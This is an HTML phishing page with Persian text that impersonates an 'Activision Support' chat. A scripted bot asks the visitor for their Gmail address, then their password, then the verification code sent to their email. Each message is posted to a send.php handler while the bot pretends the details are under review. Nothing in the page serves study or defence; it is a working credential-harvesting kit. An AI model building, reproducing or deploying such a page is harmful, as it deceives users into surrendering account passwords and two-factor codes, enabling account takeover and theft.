<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Activision Support Chat</title>
<style>
  :root {
    --primary: #00b09b;
    --dark-bg: #0f0f0f;
    --chat-bg: #1e1e1e;
    --msg-user: #00b09b;
    --msg-support: #2a2a2a;
    --input-bg: #2b2b2b;
    --text-white: #ffffff;
    --text-gray: #dddddd;
    --border-radius: 18px;
  }
  * {
    box-sizing: border-box;
    margin: 0; padding: 0;
    -webkit-tap-highlight-color: transparent;
  }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background-color: var(--dark-bg);
    color: var(--text-white);
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 0;
    touch-action: manipulation;
  }
  .chat-app {
    width: 100%;
    height: 100vh;
    max-width: 500px;
    background-color: var(--chat-bg);
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }
  .chat-header {
    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
      url('https://www.activision.com/content/dam/atvi/activision/atvi-touchui/home/hero/COD-MWIII-001-Homepage-hero-desktop.jpg') center/cover;
    padding: 15px;
    height: 80px;
    display: flex;
    align-items: flex-end;
    flex-shrink: 0;
  }
  .brand {
    display: flex;
    flex-direction: column;
  }
  .brand-name {
    font-size: clamp(1.3rem, 4vw, 1.8rem);
    font-weight: 900;
    background: linear-gradient(to right, var(--text-white), #c0c0c0);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    text-transform: uppercase;
  }
  .brand-sub {
    font-size: clamp(0.7rem, 3vw, 0.85rem);
    font-weight: 600;
    color: var(--primary);
    text-transform: uppercase;
    margin-top: 2px;
  }
  .messages {
    flex: 1;
    overflow-y: auto;
    padding: 12px 10px;
    background-color: #141414;
    -webkit-overflow-scrolling: touch;
    scroll-behavior: smooth;
  }
  .message {
    max-width: 85%;
    padding: 10px 14px;
    margin-bottom: 10px;
    border-radius: var(--border-radius);
    font-size: clamp(0.8rem, 3.5vw, 0.95rem);
    line-height: 1.4;
    word-break: break-word;
    position: relative;
    animation: fadeIn 0.25s ease-out;
  }
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }
  .user {
    background-color: var(--msg-user);
    color: var(--text-white);
    margin-left: auto;
    border-bottom-right-radius: 4px;
  }
  .support {
    background-color: var(--msg-support);
    color: var(--text-gray);
    margin-right: auto;
    border-bottom-left-radius: 4px;
  }
  .input-area {
    display: flex;
    padding: 12px;
    background-color: #161616;
    border-top: 1px solid #333;
  }
  .message-input {
    flex: 1;
    padding: 12px 16px;
    border: none;
    border-radius: 24px;
    background-color: var(--input-bg);
    color: var(--text-white);
    font-size: clamp(0.8rem, 3.5vw, 0.95rem);
    outline: none;
    min-height: 44px;
  }
  .send-btn {
    width: 44px;
    height: 44px;
    margin-left: 8px;
    border: none;
    border-radius: 50%;
    background-color: var(--primary);
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s;
  }
  .send-btn:active {
    transform: scale(0.96);
  }
  .send-icon {
    width: 20px;
    height: 20px;
  }
  @media (min-width: 500px) {
    .chat-app {
      height: 90vh;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }
  }
  @supports (padding: max(0px)) {
    .input-area {
      padding-bottom: max(12px, env(safe-area-inset-bottom));
    }
    .messages {
      padding-bottom: env(safe-area-inset-bottom);
    }
  }
</style>
</head>
<body>
  <div class="chat-app">
    <div class="chat-header">
      <div class="brand">
        <div class="brand-name">ACTIVISION</div>
        <div class="brand-sub">SUPPORT</div>
      </div>
    </div>

    <div class="messages" id="messages"></div>

    <div class="input-area">
      <input type="text" class="message-input" id="userInput" placeholder="پیام خود را بنویسید..." autocomplete="off" />
      <button class="send-btn" id="sendBtn" aria-label="ارسال پیام">
        <svg class="send-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M22 2L11 13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <path d="M22 2L15 22L11 13L2 9L22 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </button>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const messagesEl = document.getElementById('messages');
      const userInput = document.getElementById('userInput');
      const sendBtn = document.getElementById('sendBtn');

      let chatState = 'askEmail';
      let email = '';
      let password = '';
      let session = Date.now();

      const addMessage = (text, sender) => {
        const msg = document.createElement('div');
        msg.className = `message ${sender}`;
        msg.textContent = text;
        messagesEl.appendChild(msg);
        messagesEl.scrollTop = messagesEl.scrollHeight;
      };

      const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

      const sendToServer = async (message) => {
        try {
          const data = new FormData();
          data.append('session', session);
          data.append('message', message);

          const res = await fetch('send.php', {
            method: 'POST',
            body: data,
          });

          if (!res.ok) {
            throw new Error(`خطا در پاسخ سرور: ${res.status} ${res.statusText}`);
          }

          const json = await res.json();

          if (json.status !== 'ok') {
            throw new Error('خطا در ارسال به سرور: ' + (json.error || 'خطای ناشناخته'));
          }
        } catch (err) {
          console.error('خطا در ارسال به سرور:', err);
          alert('خطا در ارسال به سرور: ' + err.message);
        }
      };

      const handleBot = (text) => {
        switch (chatState) {
          case 'askEmail':
            addMessage('لطفاً جیمیل حساب خود را ارسال کنید.', 'support');
            chatState = 'waitEmail';
            break;
          case 'waitEmail':
            if (validateEmail(text)) {
              email = text;
              addMessage('ممنون. حالا لطفاً رمز عبور حساب را وارد کنید.', 'support');
              chatState = 'waitPassword';
            } else {
              addMessage('جیمیل وارد شده معتبر نیست. لطفاً مجدداً وارد کنید.', 'support');
            }
            break;
          case 'waitPassword':
            password = text;
            addMessage('رمز عبور دریافت شد. لطفاً کد ارسال‌شده به جیمیل را وارد کنید.', 'support');
            chatState = 'waitCode';
            break;
          case 'waitCode':
            addMessage('کد دریافت شد. اطلاعات شما در حال بررسی است...', 'support');
            chatState = 'done';
            break;
          case 'done':
            addMessage('در حال حاضر اطلاعات شما بررسی شده‌است. لطفاً صبور باشید.', 'support');
            break;
        }
      };

      const sendMessage = () => {
        const text = userInput.value.trim();
        if (!text) return;
        addMessage(text, 'user');
        sendToServer(text);
        userInput.value = '';
        setTimeout(() => handleBot(text), 600);
      };

      sendBtn.addEventListener('click', sendMessage);
      userInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendMessage();
      });

      setTimeout(() => handleBot(''), 500);
    });
  </script>
</body>
</html>
